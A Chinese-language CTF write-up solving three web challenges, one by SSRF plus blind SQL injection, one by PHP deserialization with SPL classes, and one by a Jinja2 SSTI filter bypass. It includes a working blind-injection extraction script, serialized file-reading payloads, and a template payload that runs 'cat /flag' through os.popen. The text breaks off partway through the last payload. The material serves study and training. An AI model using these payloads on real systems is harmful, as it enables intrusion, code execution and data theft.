<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no session"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">"./php/check_ip.php"</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span>(check_inner_ip($url))&#123;</span><br><span class="line">        <span class="keyword">if</span>($url)&#123;</span><br><span class="line">            $ch = curl_init();</span><br><span class="line">            curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">            curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_FOLLOWLOCATION,<span class="number">1</span>);</span><br><span class="line">            $output = curl_exec($ch);</span><br><span class="line">            $result_info = curl_getinfo($ch);</span><br><span class="line">            curl_close($ch);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your IP is internal yoyoyo"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>经目录探测发现存在admin.php，但需要localhost才能访问，XFF伪造不能达到效果，需利用SSRF，分析代码：</p>
<p>代码开头部分限制了必须设置session，否则就退出程序不再往下执行。这里我们使用        <code>PHP_SESSION_UPLOAD_PROGRESS</code>上传session即可。</p>
<blockquote>
<p>session.upload_progress是php&gt;=5.4添加的。最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在session中（包含用户可控的值），即使此时用户没有初始化session，PHP也会自动初始化session。 而且，默认情况下session.upload_progress.enabled是为开启的</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://183.129.189.60:10015/?url=http://localhost/admin.php'</span></span><br><span class="line">mydata = &#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>:<span class="string">'A1'</span>&#125; </span><br><span class="line">myfile = &#123;<span class="string">'file'</span>:(<span class="string">'A1.txt'</span>,<span class="string">'A1'</span>)&#125;</span><br><span class="line">mycookie = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'jtq4q3fdfgnckcrd52a6nhf90a'</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=mydata, files=myfile, cookies=mycookie)</span><br><span class="line">print(r.request.body.decode(<span class="string">'utf8'</span>))</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/07/IHoCqd6kRwYUt2L.png" alt="img"></p>
<p>下载这个文件，里面是se1f_log3n.php:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./php/db.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./php/check_ip.php"</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"><span class="keyword">if</span>($ip !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    $sql = <span class="string">'SELECT `username`,`password` FROM `user` WHERE `username`= "'</span>.$username.<span class="string">'" and `password`="'</span>.$password.<span class="string">'";'</span>;</span><br><span class="line">    $result = $con-&gt;query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    ($result-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> $row = $result-&gt;fetch_assoc() <span class="keyword">AND</span> $con-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">"error"</span>)) <span class="keyword">OR</span> ( ($con-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">'Try again!'</span>) )); </span><br><span class="line">&#125;    <span class="comment">// 没有输出查询结果</span></span><br></pre></td></tr></table></figure></div>

<p>存在sql盲注，且题目得名子是ez_login，那我们可以猜测本题旨在是让我们通过sql注入得到admin的密码。</p>
<p>bool盲注：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">payload = 'http://localhost//se1f_Log3n.php?username=A1\'or ascii(mid((<span class="keyword">select</span> <span class="keyword">user</span>()),&#123;&#125;,<span class="number">1</span>))=&#123;&#125;%<span class="number">23</span><span class="keyword">password</span>=A1<span class="string">'.format(l,ord(s))</span></span><br><span class="line"><span class="string">user(): root@localhost</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = '</span><span class="keyword">http</span>://localhost//se1f_Log3n.php?username=A1\<span class="string">'or ascii(mid((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))=&#123;&#125;%23password=A1'</span>.format(l,<span class="keyword">ord</span>(s))</span><br><span class="line"><span class="keyword">databases</span>: ctf,information_schema,mysql,performance_schema,<span class="keyword">test</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'http://localhost//se1f_Log3n.php?username=A1\'</span><span class="keyword">or</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),&#123;&#125;,<span class="number">1</span>))=&#123;&#125;%<span class="number">23</span><span class="keyword">password</span>=A1<span class="string">'.format(l,ord(s))</span></span><br><span class="line"><span class="string">Table_in_ctf: secret,users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = '</span><span class="keyword">http</span>://localhost//se1f_Log3n.php?username=A1\<span class="string">'or ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=\'</span>secret\<span class="string">'),&#123;&#125;,1))=&#123;&#125;%23password=A1'</span>.format(l,<span class="keyword">ord</span>(s))</span><br><span class="line">Column_in_secret: flag</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'http://localhost//se1f_Log3n.php?username=A1\'</span><span class="keyword">or</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> ctf.secret),&#123;&#125;,<span class="number">1</span>))=&#123;&#125;%<span class="number">23</span><span class="keyword">password</span>=A1<span class="string">'.format(l,ord(s))</span></span><br></pre></td></tr></table></figure></div>

<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">asc_str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~"</span></span><br><span class="line">mydata = &#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>:<span class="string">'A1'</span>&#125; </span><br><span class="line">myfile = &#123;<span class="string">'file'</span>:(<span class="string">'A1.txt'</span>,<span class="string">'A1'</span>)&#125;</span><br><span class="line">mycookie = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'a09fhn6a25drckcngfdf3q4qtj'</span>&#125;</span><br><span class="line">ip = <span class="string">'http://183.129.189.60:10015/?url='</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> asc_str:</span><br><span class="line">        payload = <span class="string">'http://localhost//se1f_Log3n.php?username=A1\'or ascii(mid((select flag from ctf.secret),&#123;&#125;,1))=&#123;&#125;%23password=A1'</span>.format(l,ord(s))</span><br><span class="line">        url = ip + quote(payload)</span><br><span class="line">        r = requests.post(url=url, data=mydata, files=myfile, cookies=mycookie)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'correct?'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += s</span><br><span class="line">            print(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/07/lqbWX8RMpOmoT6Y.png" alt="img"></p>
<h5 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a><strong>ez_serialize</strong></h5><p>题目给出源码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">"B"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">"ctfer"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'bad hacker~'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"hello "</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span><span class="params">($code)</span></span>&#123;</span><br><span class="line">        $pattern = <span class="string">'/[!|@|#|$|%|^|&amp;|*|=|\'|"|:|;|?]/i'</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure></div>

<p>class A中construct()方法给变量设置了初始值，然后拼接了动态类（类名和参数都可控）并且实例化后输出结果。wakeup()方法实例化了class C，然后验证了$this-&gt;para和$this-&gt;class之后进行了拼接动态类、实例化、并且输出。class B没什么用，__construct()会输出$this-&gt;a。class C类用于过滤一些指定字符，不过这里过滤没什么用。</p>
<p>利用PHP标准库 (SPL): <a href="https://www.php.net/manual/zh/book.spl.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/book.spl.php</a></p>
<p>首先利用<code>DirectoryIterator</code>或<code>FilesystemIterator</code>类去遍历目标的Web目录：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">'FilesystemIterator'</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator("/var/www/html")</span></span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">"/var/www/html/"</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$poc  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($poc);</span><br></pre></td></tr></table></figure></div>

<p>得到payload：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">1</span>:<span class="string">"A"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">5</span>:<span class="string">"class"</span>;<span class="string">s:</span><span class="number">18</span>:<span class="string">"FilesystemIterator"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"para"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"/var/www/html/"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"check"</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行后得到一个文件夹 1aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE：</p>
<p><img src="https://i.loli.net/2021/04/07/aRo8y2quPJVSWEe.png" alt="img"></p>
<p>继续浏览这个目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line">?pop=O:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">5</span>:<span class="string">"class"</span>;<span class="string">s:</span><span class="number">18</span>:<span class="string">"FilesystemIterator"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"para"</span>;<span class="string">s:</span><span class="number">47</span>:<span class="string">"/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"check"</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/07/IpKjmSb1yuOQMXz.png" alt="img"></p>
<p>然后我们使用 SplFileObject 类读取flag.php就行了：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">"SplFileObject"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">"/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">$poc = <span class="keyword">new</span> A(); </span><br><span class="line"><span class="keyword">echo</span> serialize($poc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>得到payload：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"A"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"class"</span>;<span class="attribute">s</span>:<span class="number">13</span>:<span class="string">"SplFileObject"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"para"</span>;<span class="attribute">s</span>:<span class="number">56</span>:<span class="string">"/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/07/uKYGc2SULAkN9Qy.png" alt="img"></p>
<h5 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a><strong>baby_flask</strong></h5><p>Jinja2 模板的 SSTI</p>
<p>进入题目，是一个输出框。输入你的名字，然后随机返回给你一个幸运数字：</p>
<p><img src="https://i.loli.net/2021/04/07/tVYgIuNidMkObvo.png" alt="img"></p>
<p>猜测<code>/getname?name=</code> 处应该存在SSTI。查看源码，发现blacklist</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">Hi young boy!&lt;/<span class="keyword">br</span>&gt;</span><br><span class="line">Do you like ssti?&lt;/<span class="keyword">br</span>&gt;</span><br><span class="line"></span><br><span class="line">blacklist&lt;/<span class="keyword">br</span>&gt;   </span><br><span class="line"><span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">'\'</span><span class="string">','</span><span class="comment">"',''\\','+',':','_',&lt;/br&gt;   </span></span><br><span class="line"><span class="string">'chr'</span>,<span class="string">'pop'</span>,<span class="string">'class'</span>,<span class="string">'base'</span>,<span class="string">'mro'</span>,<span class="string">'init'</span>,<span class="string">'globals'</span>,<span class="string">'get'</span>,&lt;/<span class="keyword">br</span>&gt;   </span><br><span class="line"><span class="string">'eval'</span>,<span class="string">'exec'</span>,<span class="string">'os'</span>,<span class="string">'popen'</span>,<span class="string">'open'</span>,<span class="string">'read'</span>,&lt;/<span class="keyword">br</span>&gt;   </span><br><span class="line"><span class="string">'select'</span>,<span class="string">'url_for'</span>,<span class="string">'get_flashed_messages'</span>,<span class="string">'config'</span>,<span class="string">'request'</span>,&lt;/<span class="keyword">br</span>&gt;   </span><br><span class="line"><span class="string">'count'</span>,<span class="string">'length'</span>,<span class="string">'０'</span>,<span class="string">'１'</span>,<span class="string">'２'</span>,<span class="string">'３'</span>,<span class="string">'４'</span>,<span class="string">'５'</span>,<span class="string">'６'</span>,<span class="string">'７'</span>,<span class="string">'８'</span>,<span class="string">'９'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>&lt;/<span class="keyword">br</span>&gt;    </span><br><span class="line">&lt;/<span class="keyword">br</span>&gt;   </span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p>过滤的比较多，但还是可以绕过的</p>
<p>Payload构造过程如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TWIG"><figure class="iseeu highlight /twig"><table><tr><td class="code"><pre><span class="line"><span class="xml"># 首先构造出所需的数字: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> zero = (self|int) %&#125;</span><span class="xml">    # 0, 也可以使用lenght过滤器获取数字</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> one = (zero**zero)|int %&#125;</span><span class="xml">    # 1</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> two = (zero-one-one)|<span class="keyword">abs</span> %&#125;</span><span class="xml">    # 2</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> four = (two*two)|int %&#125;</span><span class="xml">    # 4</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> five = (two*two*two)-one-one-one %&#125;</span><span class="xml">    # 5</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> three = five-one-one %&#125;</span><span class="xml">    # 3</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> nine = (two*two*two*two-five-one-one) %&#125;</span><span class="xml">    # 9</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> seven = (zero-one-one-five)|<span class="keyword">abs</span> %&#125;</span><span class="xml">    # 7</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 构造出所需的各种字符与字符串: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> space = self|string|min %&#125;</span><span class="xml">    # 空格</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> point = self|float|string|min %&#125;</span><span class="xml">    # .</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> c = dict(c=aa)|<span class="keyword">reverse</span>|<span class="keyword">first</span> %&#125;</span><span class="xml">    # 字符 c</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfh = self|string|urlencode|<span class="keyword">first</span> %&#125;</span><span class="xml">    # 百分号 %</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfhc = bfh~c %&#125;</span><span class="xml">    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> slas = bfhc%((four~seven)|int) %&#125;</span><span class="xml">    # 使用%c构造斜杠 /</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> yin = bfhc%((three~nine)|int) %&#125;</span><span class="xml">    # 使用%c构造引号 '</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xhx = bfhc%((nine~five)|int) %&#125;</span><span class="xml">    # 使用%c构造下划线 _</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> right = bfhc%((four~one)|int) %&#125;</span><span class="xml">    # 使用%c构造右括号 )</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> left = bfhc%((four~zero)|int) %&#125;</span><span class="xml">    # 使用%c构造左括号 (</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> but = dict(buil=aa,tins=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # builtins</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> imp = dict(imp=aa,ort=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # import</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pon = dict(po=aa,pen=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # popen</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> so = dict(o=aa,s=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # os</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ca = dict(ca=aa,t=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # cat</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> flg = dict(fl=aa,ag=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # flag</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ev = dict(ev=aa,al=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # eval</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> red = dict(re=aa,ad=dd)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # read</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bul = xhx~xhx~but~xhx~xhx %&#125;</span><span class="xml">    # __builtins__</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ini = dict(ini=aa,t=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # init</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> glo = dict(glo=aa,bals=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # globals</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> itm = dict(ite=aa,ms=bb)|<span class="keyword">join</span> %&#125;</span><span class="xml">    # items</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read(): </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: </span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><span class="xml">    # globals</span></span><br><span class="line"><span class="xml">	</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> f == bul %&#125;</span><span class="xml"> </span></span><br><span class="line"><span class="xml">		</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> a,b in (v|attr(itm))() %&#125;</span><span class="xml">    # builtins</span></span><br><span class="line"><span class="xml">			</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> a == ev %&#125;</span><span class="xml">    # eval</span></span><br><span class="line"><span class="xml">				</span><span class="template-variable">&#123;&#123;b(pld)&#125;&#125;</span><span class="xml">    # eval("__import__('os').popen('cat /flag').read()")</span></span><br><span class="line"><span class="xml">			</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml">		</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br><span class="line"><span class="xml">	</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"># 最后的payload如下:</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> zero = (self|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> one = (zero**zero)|int %&#125;</span><span class="template-tag">&#123;% <span class="name"><span 